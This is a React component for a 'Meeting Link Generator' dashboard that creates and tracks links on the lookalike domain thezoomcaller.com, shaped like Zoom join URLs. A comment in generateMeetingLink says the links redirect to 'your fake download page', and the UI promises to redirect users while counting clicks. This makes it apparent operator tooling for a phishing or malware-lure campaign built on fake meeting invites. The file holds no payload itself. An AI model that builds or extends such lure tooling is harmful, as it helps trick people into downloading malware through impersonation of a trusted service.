'use client';

import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { 
  Link, 
  Copy, 
  Calendar, 
  Clock, 
  Users, 
  Eye, 
  EyeOff,
  Plus,
  Trash2,
  ExternalLink
} from 'lucide-react';

interface MeetingLink {
  id: string;
  title: string;
  description: string;
  link: string;
  createdAt: string;
  expiresAt?: string;
  maxParticipants?: number;
  isActive: boolean;
  clickCount: number;
  lastClicked?: string;
}

const MeetingLinkGenerator: React.FC = () => {
  const [meetingLinks, setMeetingLinks] = useState<MeetingLink[]>([
    {
      id: '1',
      title: 'Team Meeting - Q4 Planning',
      description: 'Quarterly planning session for all departments',
      link: 'https://thezoomcaller.com/meeting/j/123456789',
      createdAt: '2024-07-20T10:00:00Z',
      expiresAt: '2024-07-27T10:00:00Z',
      maxParticipants: 50,
      isActive: true,
      clickCount: 23,
      lastClicked: '2024-07-20T14:30:00Z'
    },
    {
      id: '2',
      title: 'Client Presentation',
      description: 'Product demo for potential client',
      link: 'https://thezoomcaller.com/meeting/j/987654321',
      createdAt: '2024-07-19T15:00:00Z',
      maxParticipants: 10,
      isActive: true,
      clickCount: 8,
      lastClicked: '2024-07-20T09:15:00Z'
    },
    {
      id: '3',
      title: 'All Hands Meeting',
      description: 'Monthly company-wide meeting',
      link: 'https://thezoomcaller.com/meeting/j/456789123',
      createdAt: '2024-07-18T09:00:00Z',
      expiresAt: '2024-07-25T09:00:00Z',
      maxParticipants: 200,
      isActive: false,
      clickCount: 156,
      lastClicked: '2024-07-18T11:45:00Z'
    }
  ]);

  const [showCreateForm, setShowCreateForm] = useState(false);
  const [newMeeting, setNewMeeting] = useState({
    title: '',
    description: '',
    maxParticipants: 50,
    expiresIn: 7 // days
  });

  const generateMeetingLink = () => {
    const meetingId = Math.random().toString(36).substring(2, 15);
    // Use your custom domain to redirect to your fake download page
    return `https://thezoomcaller.com/meeting/j/${meetingId}`;
  };

  const createMeetingLink = async () => {
    if (!newMeeting.title.trim()) return;

    const newLink: MeetingLink = {
      id: Date.now().toString(),
      title: newMeeting.title,
      description: newMeeting.description,
      link: generateMeetingLink(),
      createdAt: new Date().toISOString(),
      expiresAt: newMeeting.expiresIn > 0 
        ? new Date(Date.now() + newMeeting.expiresIn * 24 * 60 * 60 * 1000).toISOString()
        : undefined,
      maxParticipants: newMeeting.maxParticipants,
      isActive: true,
      clickCount: 0
    };

    setMeetingLinks(prev => [newLink, ...prev]);
    setNewMeeting({ title: '', description: '', maxParticipants: 50, expiresIn: 7 });
    setShowCreateForm(false);
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      // You could add a toast notification here
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  const deleteMeetingLink = (id: string) => {
    setMeetingLinks(prev => prev.filter(link => link.id !== id));
  };

  const toggleMeetingStatus = (id: string) => {
    setMeetingLinks(prev => prev.map(link => 
      link.id === id ? { ...link, isActive: !link.isActive } : link
    ));
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const isExpired = (expiresAt?: string) => {
    if (!expiresAt) return false;
    return new Date(expiresAt) < new Date();
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold text-white">Meeting Link Generator</h2>
          <p className="text-gray-400">Create and manage meeting links that redirect to your website</p>
        </div>
        <Button
          onClick={() => setShowCreateForm(!showCreateForm)}
          className="bg-blue-1 hover:bg-blue-1/80"
        >
          <Plus className="w-4 h-4 mr-2" />
          Create Meeting Link
        </Button>
      </div>

      {/* Create Form */}
      {showCreateForm && (
        <Card className="bg-dark-1 border-dark-3">
          <CardHeader>
            <CardTitle className="text-white">Create New Meeting Link</CardTitle>
            <CardDescription className="text-gray-400">
              Generate a new meeting link that will redirect users to your website
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Meeting Title
              </label>
              <input
                type="text"
                value={newMeeting.title}
                onChange={(e) => setNewMeeting(prev => ({ ...prev, title: e.target.value }))}
                placeholder="e.g., Team Standup, Client Demo"
                className="w-full px-3 py-2 bg-dark-3 border border-gray-600 rounded-md text-white placeholder-gray-500 focus:outline-none focus:border-blue-1"
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Description (Optional)
              </label>
              <textarea
                value={newMeeting.description}
                onChange={(e) => setNewMeeting(prev => ({ ...prev, description: e.target.value }))}
                placeholder="Brief description of the meeting"
                rows={3}
                className="w-full px-3 py-2 bg-dark-3 border border-gray-600 rounded-md text-white placeholder-gray-500 focus:outline-none focus:border-blue-1"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Max Participants
                </label>
                <input
                  type="number"
                  value={newMeeting.maxParticipants}
                  onChange={(e) => setNewMeeting(prev => ({ ...prev, maxParticipants: parseInt(e.target.value) || 50 }))}
                  min="1"
                  max="1000"
                  className="w-full px-3 py-2 bg-dark-3 border border-gray-600 rounded-md text-white focus:outline-none focus:border-blue-1"
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Expires In (Days)
                </label>
                <input
                  type="number"
                  value={newMeeting.expiresIn}
                  onChange={(e) => setNewMeeting(prev => ({ ...prev, expiresIn: parseInt(e.target.value) || 7 }))}
                  min="0"
                  placeholder="0 = Never expires"
                  className="w-full px-3 py-2 bg-dark-3 border border-gray-600 rounded-md text-white focus:outline-none focus:border-blue-1"
                />
              </div>
            </div>

            <div className="flex gap-2">
              <Button onClick={createMeetingLink} className="bg-blue-1 hover:bg-blue-1/80">
                <Link className="w-4 h-4 mr-2" />
                Generate Link
              </Button>
              <Button 
                variant="outline" 
                onClick={() => setShowCreateForm(false)}
                className="border-gray-600 text-gray-300 hover:bg-gray-700"
              >
                Cancel
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Meeting Links List */}
      <div className="space-y-4">
        {meetingLinks.map((link) => (
          <Card key={link.id} className="bg-dark-1 border-dark-3">
            <CardContent className="p-6">
              <div className="flex items-start justify-between">
                <div className="flex-1">
                  <div className="flex items-center gap-3 mb-2">
                    <h3 className="text-lg font-semibold text-white">{link.title}</h3>
                    <Badge 
                      variant={link.isActive ? "default" : "secondary"}
                      className={link.isActive ? "bg-green-600" : "bg-gray-600"}
                    >
                      {link.isActive ? 'Active' : 'Inactive'}
                    </Badge>
                    {isExpired(link.expiresAt) && (
                      <Badge variant="destructive">Expired</Badge>
                    )}
                  </div>
                  
                  {link.description && (
                    <p className="text-gray-400 mb-3">{link.description}</p>
                  )}

                  <div className="flex items-center gap-6 text-sm text-gray-400 mb-4">
                    <div className="flex items-center gap-1">
                      <Calendar className="w-4 h-4" />
                      Created: {formatDate(link.createdAt)}
                    </div>
                    {link.expiresAt && (
                      <div className="flex items-center gap-1">
                        <Clock className="w-4 h-4" />
                        Expires: {formatDate(link.expiresAt)}
                      </div>
                    )}
                    <div className="flex items-center gap-1">
                      <Users className="w-4 h-4" />
                      Max: {link.maxParticipants}
                    </div>
                    <div className="flex items-center gap-1">
                      <ExternalLink className="w-4 h-4" />
                      Clicks: {link.clickCount}
                    </div>
                    {link.lastClicked && (
                      <div className="flex items-center gap-1">
                        <Clock className="w-4 h-4" />
                        Last: {formatDate(link.lastClicked)}
                      </div>
                    )}
                  </div>

                  <div className="flex items-center gap-2">
                    <div className="flex-1 px-3 py-2 bg-dark-3 border border-gray-600 rounded-md text-white font-mono text-sm">
                      {link.link}
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => copyToClipboard(link.link)}
                      className="border-gray-600 text-gray-300 hover:bg-gray-700"
                    >
                      <Copy className="w-4 h-4" />
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => window.open(link.link, '_blank')}
                      className="border-gray-600 text-gray-300 hover:bg-gray-700"
                    >
                      <ExternalLink className="w-4 h-4" />
                    </Button>
                  </div>
                </div>

                <div className="flex flex-col gap-2 ml-4">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => toggleMeetingStatus(link.id)}
                    className={`border-gray-600 ${
                      link.isActive 
                        ? 'text-orange-400 hover:bg-orange-600 hover:border-orange-600' 
                        : 'text-green-400 hover:bg-green-600 hover:border-green-600'
                    }`}
                  >
                    {link.isActive ? (
                      <>
                        <EyeOff className="w-4 h-4 mr-1" />
                        Deactivate
                      </>
                    ) : (
                      <>
                        <Eye className="w-4 h-4 mr-1" />
                        Activate
                      </>
                    )}
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => deleteMeetingLink(link.id)}
                    className="border-red-500 text-red-400 hover:bg-red-600 hover:border-red-600"
                  >
                    <Trash2 className="w-4 h-4" />
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {meetingLinks.length === 0 && (
        <Card className="bg-dark-1 border-dark-3">
          <CardContent className="py-12 text-center">
            <Link className="w-16 h-16 mx-auto mb-4 text-gray-500" />
            <p className="text-xl text-gray-400 mb-4">No meeting links created yet</p>
            <p className="text-gray-500 mb-6">
              Create your first meeting link to start redirecting users to your website.
            </p>
            <Button 
              onClick={() => setShowCreateForm(true)}
              className="bg-blue-1 hover:bg-blue-1/80"
            >
              <Plus className="w-4 h-4 mr-2" />
              Create First Meeting Link
            </Button>
          </CardContent>
        </Card>
      )}
    </div>
  );
};

export default MeetingLinkGenerator;
